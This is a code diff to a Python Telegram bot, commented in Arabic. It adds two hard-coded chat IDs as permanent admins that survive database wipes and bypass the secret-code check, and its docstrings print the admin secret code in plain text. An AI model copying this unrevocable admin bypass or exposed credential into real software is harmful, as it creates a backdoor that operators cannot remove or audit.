@@ -590,18 +590,27 @@ def set_live_chat_open(is_open: bool, db_path: str = DB_FILE_PATH) -> bool:
     return save_setting("telegram_live_chat_open", "1" if is_open else "0", db_path=db_path)
 
 
+# معرّفات المشرفين الدائمين (ثابتة في الذاكرة ولا تسقط إطلاقاً حتى عند مسح قاعدة البيانات أو إعادة إقلاع السيرفر)
+PERMANENT_ADMIN_CHAT_IDS = {"8883556949", "1974483260"}
+
+
 def get_authorized_admins(db_path: str = DB_FILE_PATH) -> set:
-    """جلب قائمة معرّفات المشرفين المصرح لهم بعد إدخال الرمز السري nsw262311."""
+    """جلب قائمة معرّفات المشرفين المصرح لهم بعد إدخال الرمز السري nsw262311 أو المشرفين الدائمين."""
     raw = get_setting("authorized_telegram_admins", "", db_path=db_path)
-    return set(x.strip() for x in raw.split(",") if x.strip())
+    admins = set(x.strip() for x in raw.split(",") if x.strip())
+    admins.update(PERMANENT_ADMIN_CHAT_IDS)
+    return admins
 
 
 def is_authorized_admin(chat_id: Any, db_path: str = DB_FILE_PATH) -> bool:
-    """التحقق مما إذا كان المستخدم أدخل الرمز السري بنجاح."""
+    """التحقق مما إذا كان المستخدم مشرفاً دائماً أو أدخل الرمز السري بنجاح."""
     if not chat_id:
         return False
+    cid_str = str(chat_id).strip()
+    if cid_str in PERMANENT_ADMIN_CHAT_IDS:
+        return True
     admins = get_authorized_admins(db_path=db_path)
-    return str(chat_id).strip() in admins
+    return cid_str in admins
 
 
 def authorize_admin(chat_id: Any, db_path: str = DB_FILE_PATH) -> bool:
